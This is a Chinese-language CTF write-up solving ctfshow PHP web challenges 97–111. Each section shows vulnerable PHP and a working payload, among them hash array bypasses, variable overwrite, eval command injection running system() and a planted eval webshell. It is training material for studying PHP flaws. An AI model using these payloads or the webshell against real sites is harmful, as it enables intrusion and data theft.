<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?u=./flag.php			<span class="comment">#路径?u=/var/www/html/flag.php?u=php://filter/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h2 id="1-9-Web-97-—-md5-数组-绕过-—-if-POST-39-a-39-POST-39-b-39-amp-amp-md5-POST-39-a-39-md5-POST-39-b-39"><a href="#1-9-Web-97-—-md5-数组-绕过-—-if-POST-39-a-39-POST-39-b-39-amp-amp-md5-POST-39-a-39-md5-POST-39-b-39" class="headerlink" title="1.9 Web 97 — md5 数组 [ ] 绕过 — if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))"></a>1.9 Web 97 — md5 数组 [ ] 绕过 — <code>if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;<span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="keyword">if</span> (md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))<span class="keyword">echo</span> <span class="variable">$flag</span>;elseprint <span class="string">&#x27;Wrong.&#x27;</span>;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>

<h2 id="1-10-Web-98-—-三目运算符、变量覆盖"><a href="#1-10-Web-98-—-三目运算符、变量覆盖" class="headerlink" title="1.10 Web 98 — 三目运算符、变量覆盖"></a>1.10 Web 98 — 三目运算符、变量覆盖</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#三目运算符以及变量覆盖若GET传参，POST值将覆盖GET值</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">get传参：?flag=1post传参：?HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>

<h2 id="1-11-Web-99-—-file-put-contents"><a href="#1-11-Web-99-—-file-put-contents" class="headerlink" title="1.11 Web 99 — file_put_contents"></a>1.11 Web 99 — file_put_contents</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="variable">$allow</span> = <span class="keyword">array</span>();<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;     array_push(<span class="variable">$allow</span>, rand(<span class="number">1</span>,<span class="variable">$i</span>));&#125;<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;    file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/17/fi76py2toXNEksO.png" alt="image-20210717144542465"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">当没有第三个参数时，in_array之中的比较与 == 一致当第三个参数为 <span class="literal">true</span> 时，in_array之中的比较与 === 一致<span class="variable">$allow</span> = array(1,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>);var_dump(in_array(<span class="string">&#x27;1.php&#x27;</span>,<span class="variable">$allow</span>));<span class="comment">#类型不同，首先转换，返回 true$allow = array(&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);var_dump(in_array(&#x27;1.php&#x27;,$allow));#类型一致，直接比较，返回false</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload?n=1.phpcontent=&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问 /1.php</p>
<p><img src="https://i.loli.net/2021/08/05/M8ypxAwW7jNsoP6.png" alt="image-20210805214445932"></p>
<h2 id="1-12-Web-100-—-eval-“-v2-‘ctfshow’-v3”"><a href="#1-12-Web-100-—-eval-“-v2-‘ctfshow’-v3”" class="headerlink" title="1.12 Web 100 — eval(“$v2(‘ctfshow’)$v3”);"></a>1.12 Web 100 — eval(“$v2(‘ctfshow’)$v3”);</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);<span class="comment">//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;        if(preg_match(&quot;/\;/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;   &#125;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>var_dump(<span class="literal">true</span> <span class="keyword">and</span> <span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span>);	<span class="comment">// falsevar_dump(true and false and false);// falsevar_dump(true &amp;&amp; true &amp;&amp; false);// falsevar_dump(true &amp;&amp; false &amp;&amp; false);// false$a=true and false and false;var_dump($a);  // true$b = true &amp;&amp; false &amp;&amp; false;var_dump($b); //false$c = true &amp; false &amp; false;var_dump($c); //bool(0)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=<span class="literal">true</span> and <span class="literal">false</span> and <span class="literal">false</span>;var_dump(<span class="variable">$a</span>);  // trueif(<span class="variable">$a</span> === <span class="literal">true</span> and <span class="literal">false</span> and <span class="literal">false</span>)&#123;	<span class="built_in">echo</span> <span class="string">&#x27;111&#x27;</span>;	//不输出&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=<span class="literal">false</span> and <span class="literal">true</span> and <span class="literal">true</span>;var_dump(<span class="variable">$a</span>); <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="literal">false</span> and <span class="literal">true</span> and <span class="literal">true</span>)&#123;	<span class="built_in">echo</span> <span class="string">&#x27;111&#x27;</span>;	&#125;//bool(<span class="literal">false</span>) 111</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. <span class="keyword">if</span>(<span class="variable">$v0</span>)绕过：v1 是数字2. v2 不能有分号，那么无法使用 命令执行函数，那么使用 ``3. 使用注释将 v3 注释掉，相当于把 (<span class="string">&#x27;ctfshow&#x27;</span>) 注释掉4. 注意，v3 一定要写上 ;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;?v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=?&gt;&lt;?php echo `cat ctfshow.php`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=-system(&#x27;ls&#x27;)-&amp;v3=-1;?v1=1&amp;v2=echo&amp;v3=;system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>构造成下面的感觉</p>
<p><img src="https://i.loli.net/2021/08/05/GTRs27cIVn3MmHB.png" alt="image-20210805221256350"></p>
<p>查 ctfshow.php 试试</p>
<p><img src="https://i.loli.net/2021/08/05/xAJrKWGiBOjhmTu.png" alt="image-20210805221505214"></p>
<p>其中，<code>0x2d  </code> 是 <code>-</code></p>
<h2 id="1-13-Web-101-—-ReflectionClass-关于一个类的反射"><a href="#1-13-Web-101-—-ReflectionClass-关于一个类的反射" class="headerlink" title="1.13 Web 101 — ReflectionClass 关于一个类的反射"></a>1.13 Web 101 — ReflectionClass 关于一个类的反射</h2><p><a href="http://www.thinkphp.cn/code/4863.html">http://www.thinkphp.cn/code/4863.html</a></p>
<p><img src="https://i.loli.net/2021/08/05/WCA6wXcS4Bxt89l.png" alt="image-20210805224208153"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">修补100题非预期,替换0x2d</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);include(<span class="string">&quot;ctfshow.php&quot;</span>);//flag <span class="keyword">in</span> class ctfshow;<span class="variable">$ctfshow</span> = new ctfshow();<span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];<span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];<span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];<span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) and is_numeric(<span class="variable">$v2</span>) and is_numeric(<span class="variable">$v3</span>);<span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;            <span class="built_in">eval</span>(<span class="string">&quot;<span class="variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="variable">$v3</span>&quot;</span>);        &#125;    &#125;  &#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>上面的 v2 构造的符号 被过滤</p>
<p><strong>构造 eval(echo new ReflectionClass(‘ctfshow’));</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=<span class="built_in">echo</span> new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>

<h2 id="1-14-Web-102"><a href="#1-14-Web-102" class="headerlink" title="1.14 Web 102"></a>1.14 Web 102</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];<span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];<span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];<span class="variable">$v4</span> = is_numeric(<span class="variable">$v2</span>) and is_numeric(<span class="variable">$v3</span>);<span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;    <span class="variable">$s</span> = substr(<span class="variable">$v2</span>,2);    <span class="variable">$str</span> = call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);    <span class="built_in">echo</span> <span class="variable">$str</span>;    file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>);&#125;<span class="keyword">else</span>&#123;    die(<span class="string">&#x27;hacker&#x27;</span>);&#125;?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="1-15-Web-103"><a href="#1-15-Web-103" class="headerlink" title="1.15 Web 103"></a>1.15 Web 103</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="1-16-Web-104-—-shal-数组-绕过"><a href="#1-16-Web-104-—-shal-数组-绕过" class="headerlink" title="1.16 Web 104 — shal() 数组 [ ] 绕过"></a>1.16 Web 104 — shal() 数组 [ ] 绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">换个姿势</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>))&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?v1=1?v2=1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?v1[]=1?v2[]=2</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m</span><br></pre></td></tr></table></figure>

<h2 id="1-17-Web-105-—-变量覆盖"><a href="#1-17-Web-105-—-变量覆盖" class="headerlink" title="1.17 Web 105 — 变量覆盖"></a>1.17 Web 105 — 变量覆盖</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);error_reporting(<span class="number">0</span>);<span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;<span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;<span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);    &#125;    <span class="variable">$$key</span>=<span class="variable">$$value</span>;    &#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);    &#125;    <span class="variable">$$key</span>=<span class="variable">$$value</span>;&#125;<span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;    <span class="keyword">die</span>(<span class="variable">$error</span>);&#125;<span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;<span class="keyword">die</span>(<span class="variable">$suces</span>);<span class="meta">?&gt;</span>你还想要flag嘛？</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$<span class="variable">$key</span>=$<span class="variable">$value</span>;			<span class="comment">#变量覆盖，将值作为变量赋给键作为变量，如果传入，?suces=flag，即相当于 $suces=$flag，即将$flag的值赋给$suces，所以我只需要想办法 输出 $suces 即可</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/18/V4pOyTZECmWY2B7.png" alt="image-20210718203822905"></p>
<p>可以看到，仅仅传入以上内容，会显示 $error 报错，我们可以通过 POST传参，将 $flag 的值赋给 $error 即可</p>
<p><img src="https://i.loli.net/2021/07/18/YGmoRLev1xTq5Wz.png" alt="image-20210718203954650"></p>
<p>思考</p>
<ul>
<li><p>通过 <code>die(suces)</code> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">get: suces=flagpost: flag=</span><br></pre></td></tr></table></figure></li>
<li><p>通过 <code>die(error)</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">get: suces=flagpost: error=suces</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="1-15-Web-106-—-shal-数组-绕过"><a href="#1-15-Web-106-—-shal-数组-绕过" class="headerlink" title="1.15 Web 106 — shal() 数组 [ ] 绕过"></a>1.15 Web 106 — shal() 数组 [ ] 绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">v1[]=1v2[]=2</span><br></pre></td></tr></table></figure>

<h2 id="1-16-Web-107-—-parse-str"><a href="#1-16-Web-107-—-parse-str" class="headerlink" title="1.16 Web 107 — parse_str()"></a>1.16 Web 107 — parse_str()</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];       parse_str(<span class="variable">$v1</span>,<span class="variable">$v2</span>);       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==md5(<span class="variable">$v3</span>))&#123;           <span class="keyword">echo</span> <span class="variable">$flag</span>;       &#125;&#125;<span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#parse_str($v1,$v2);把$1字符串解析到变量 $2当中，以数组形式get: ?v3=123456post: v1=flag=e10adc3949ba59abbe56e057f20f883e</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/18/54Y8EOvFWDByebl.png" alt="image-20210718205544680"></p>
<h2 id="1-17-Web-108-—-ereg-截断漏洞"><a href="#1-17-Web-108-—-ereg-截断漏洞" class="headerlink" title="1.17 Web 108 — ereg() 截断漏洞"></a>1.17 Web 108 — ereg() 截断漏洞</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);&#125;<span class="comment">//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;    echo $flag;&#125;<span class="meta">?&gt;</span>error</span></span><br></pre></td></tr></table></figure>

 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#strrev()反转字符串#intval()获取变量整数值#0x36d 的十进制是 877</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ereg() 存在00截断漏洞，即%00之后的内容不会进行匹配函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回<span class="literal">true</span>,否则,则返回<span class="literal">false</span>。搜索字母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=sds%00778</span><br></pre></td></tr></table></figure>

<h2 id="1-18-Web-109-—-v1-v2-内置类"><a href="#1-18-Web-109-—-v1-v2-内置类" class="headerlink" title="1.18 Web 109 — $v1($v2()) 内置类"></a>1.18 Web 109 — $v1($v2()) 内置类</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);    &#125;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#随便找个php中的内置类并且可以直接echo输出的就可以ExceptionReflectionClass?v1=ReflectionClass&amp;v2=system(&#x27;ls&#x27;)?v1=Exception&amp;v2=system(&#x27;ls&#x27;)?v1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;)v1=Exception();system(&#x27;tac f*&#x27;);//&amp;v2=av1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;)</span></span><br></pre></td></tr></table></figure>

<h2 id="1-19-Web-110-—-new-v1-v2"><a href="#1-19-Web-110-—-new-v1-v2" class="headerlink" title="1.19 Web 110 — new $v1($v2())"></a>1.19 Web 110 — new $v1($v2())</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);    &#125;    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#FilesystemIterator类读取文件?v1=FilesystemIterator&amp;v2=getcwd</span></span><br></pre></td></tr></table></figure>

<h2 id="1-20-Web-111-—-变量覆盖-—-GLOBALS"><a href="#1-20-Web-111-—-变量覆盖-—-GLOBALS" class="headerlink" title="1.20 Web 111 — 变量覆盖 — $GLOBALS"></a>1.20 Web 111 — 变量覆盖 — $GLOBALS</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量覆盖</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);    var_dump(<span class="variable">$$v1</span>);&#125;<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;            getFlag(<span class="variable">$v1</span>,<span class="variable">$v2</span>);    &#125;    &#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>超全局变量 <code>$GLOBALS</code></p>
<ul>
<li><p>$GLOBALS — 引用全局作用域中可用的全部变量</p>
</li>
<li><p>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/08/02/lk3Cv7n8eOghUxq.png" alt="image-20210802083706337"></p>
